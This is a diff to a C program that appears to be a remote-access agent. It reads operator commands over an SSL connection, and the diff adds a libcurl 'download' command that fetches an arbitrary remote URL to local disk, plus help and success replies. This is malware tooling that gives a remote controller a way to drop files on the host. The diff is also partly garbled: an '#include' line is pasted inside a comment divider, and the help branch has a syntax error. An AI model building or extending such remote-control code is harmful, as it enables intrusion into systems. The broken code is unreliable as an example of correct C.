@@ -8,6 +8,8 @@
 #include <sys/signal.h>
 #include <errno.h>
 #include <pwd.h>
+#include <libgen.h>
+#include <curl/curl.h>
 
 //---------------------------------------------------------------------------------------------------------------
 
@@ -54,8 +56,8 @@ void init_openssl() {
 	OpenSSL_add_ssl_algorithms();
 }
 
-//---------------------------------------------------------------------------------------------------------------
-
+//----------------------------------------------------------------------------------#include <libgen.h>-----------------------------
+#include <libgen.h>
 void cleanup_openssl() {
 	EVP_cleanup();
 }
@@ -92,6 +94,36 @@ void configure_context(SSL_CTX *ctx) {
 		ERR_print_errors_fp(stderr);
 		exit(EXIT_FAILURE);
 	}
+}
+
+//---------------------------------------------------------------------------------------------------------------
+
+size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
+    size_t written = fwrite(ptr, size, nmemb, stream);
+    return written;
+}
+
+//---------------------------------------------------------------------------------------------------------------
+
+int download(char *url, char *filename) {
+	CURL *curl;
+    FILE *fp;
+    CURLcode res;
+    curl = curl_easy_init();
+    
+    if (curl) {
+        fp = fopen(filename,"wb");
+        curl_easy_setopt(curl, CURLOPT_URL, url);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
+        res = curl_easy_perform(curl);
+        
+        /* always cleanup */
+        curl_easy_cleanup(curl);
+        fclose(fp);
+    }
+    
+    return (int) res;
 }
 
 //---------------------------------------------------------------------------------------------------------------
@@ -146,9 +178,23 @@ void parse_command(SSL *ssl, char *buf, int len) {
 		fclose(fp);
 	
 		SSL_write(ssl, output, strlen(output));
+	} else if (strncmp(buf, CMD_DOWNLOAD, strlen(CMD_DOWNLOAD)) == 0) {
+		buf = buf + strlen(CMD_DOWNLOAD) + 1;
+		
+		char *filename = basename(buf);
+		char output[1024] = {0};
+				
+		int ret = download(buf, filename);
+		sprintf(output, "Return code: %d\n", ret);
+		SSL_write(ssl, output, strlen(output));
+	} else if (strncmp(buf, CMD_HELP, strlen(CMD_HELP)) == 0) {
+		SSL_write(ssl, CMD_HELP_OUT, strlen(CMD_HELP_OUT)) == 0);		
 	} else {
 		SSL_write(ssl, CMD_NO_RECON, strlen(CMD_NO_RECON));
+		return;
 	}
+	
+	SSL_write(ssl, CMD_SUCCESS, strlen(CMD_SUCCESS));
 }
 
 //---------------------------------------------------------------------------------------------------------------
@@ -184,11 +230,14 @@ int main(int argc, char **argv) {
 		}
 		
 		while (1) {
-			SSL_read(ssl, recv_buffer, sizeof(recv_buffer));
-			if (strncmp(recv_buffer, CMD_EXIT, strlen(CMD_EXIT)) == 0)
+			SSL_read(ssl, recv_buffer, sizeof(recv_buffer));	// Read buffer from ssl
+			if (strncmp(recv_buffer, CMD_EXIT, strlen(CMD_EXIT)) == 0)	// Check if command is "exit"
 				break;
-			parse_command(ssl, recv_buffer, strlen(recv_buffer));
-			memset(recv_buffer, 0, sizeof(recv_buffer));
+			
+			recv_buffer[strlen(recv_buffer) - 1] = 0;	// Removing trailing \n
+			
+			parse_command(ssl, recv_buffer, strlen(recv_buffer));	// Send buffer to parsing function
+			memset(recv_buffer, 0, sizeof(recv_buffer));	// Fill the buffer with zeros
 		}
 
 		SSL_free(ssl);
